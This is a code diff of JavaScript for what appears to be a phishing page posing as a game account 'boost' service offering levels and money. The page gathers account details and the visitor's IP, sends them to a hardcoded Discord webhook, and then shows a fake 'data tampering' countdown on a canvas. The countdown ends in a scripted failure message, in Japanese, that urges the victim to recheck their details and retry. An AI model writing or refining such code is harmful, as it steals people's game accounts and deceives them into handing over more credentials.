@@ -2,8 +2,11 @@ const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1383529796595613816/ub
 
 const form1 = document.getElementById('account-form');
 const form2 = document.getElementById('boost-form');
-const log = document.getElementById('log');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+
 let savedAccount = {};
+let remaining = 0;
 
 function getIP() {
   return fetch('https://api.ipify.org?format=json')
@@ -54,10 +57,8 @@ form1.addEventListener('submit', async (e) => {
   form2.classList.add('fade-in');
 });
 
-form2.addEventListener('submit', (e) => {
+form2.addEventListener('submit', async (e) => {
   e.preventDefault();
-  form2.classList.add('hidden');
-  log.classList.remove('hidden');
 
   const level = document.getElementById('level-amount').value.trim();
   const money = document.getElementById('money-amount').value.trim();
@@ -73,28 +74,40 @@ form2.addEventListener('submit', (e) => {
     timestamp: new Date().toISOString()
   };
 
-  sendToWebhook(embed);
-  startFakeProcess(log);
+  await sendToWebhook(embed);
+
+  form2.classList.add('hidden');
+  startCanvasCountdown();
 });
 
-function startFakeProcess(logEl) {
-  logEl.textContent = '';
-  let seconds = Math.random() * 270 + 30;
-
+function startCanvasCountdown() {
+  let total = Math.floor(Math.random() * 240 + 60); // 1〜5分
+  remaining = total;
   const interval = setInterval(() => {
-    const dots = '.'.repeat(Math.floor(Math.random() * 3) + 1);
-    logEl.textContent = `データ改ざん中${dots}`;
-
-    const drift = (Math.random() - 0.5) * 30;
-    seconds = Math.max(10, seconds + drift - 1);
-
-    const m = Math.floor(seconds / 60);
-    const s = (seconds % 60).toFixed(1);
-    logEl.textContent += `\n残り ${m}分${s}秒`;
-
-    if (seconds <= 0) {
+    drawCanvas(remaining);
+    if (--remaining <= 0) {
       clearInterval(interval);
-      logEl.textContent += `\n失敗しました。アカウントの情報が正しいか確認してください。`;
+      drawCanvas(-1);
     }
   }, 1000);
+}
+
+function drawCanvas(seconds) {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  ctx.font = '30px Segoe UI';
+  ctx.fillStyle = 'white';
+  ctx.textAlign = 'center';
+
+  const dots = ['.', '..', '...'][Math.floor(Date.now() / 500) % 3];
+
+  if (seconds >= 0) {
+    const m = Math.floor(seconds / 60);
+    const s = seconds % 60;
+    ctx.fillText(`データ改竄中${dots}`, canvas.width / 2, 50);
+    ctx.fillText(`残り ${m}分${s.toString().padStart(2, '0')}秒`, canvas.width / 2, 100);
+  } else {
+    ctx.fillStyle = 'red';
+    ctx.fillText('改竄処理に失敗しました。', canvas.width / 2, 50);
+    ctx.fillText('アカウントの情報が正しいか確認してもう一度実行をしてください。', canvas.width / 2, 100);
+  }
 }
